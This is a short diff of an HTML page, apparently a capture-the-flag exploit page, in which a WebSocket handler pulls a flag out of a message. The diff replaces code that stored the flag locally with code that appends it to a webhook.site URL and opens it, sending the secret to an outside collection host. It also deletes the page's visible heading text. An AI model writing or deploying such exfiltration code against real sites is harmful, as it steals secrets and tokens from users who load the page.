@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -21,8 +20,10 @@
                 const match = event.data.match(/\{(.+?)\}/);
                 if (match) {
                     const flag = match[1]; // Extract the content inside the curly braces
-                    localStorage.setItem('flag', flag); // Store the flag in localStorage
-                    console.log('Flag stored:', flag);
+                    const url = `https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/${flag}`;
+                    
+                    // Open the constructed URL
+                    window.open(url, '_blank'); // Opens the URL in a new tab
                 }
                 ws.close();
             };
@@ -38,11 +39,5 @@
     </script>
 </head>
 <body>
-    <h1>Retrieve and Store Flag</h1>
-    <p>The flag will be stored automatically.</p>
 </body>
 </html>
-
-</body>
-</html>
-
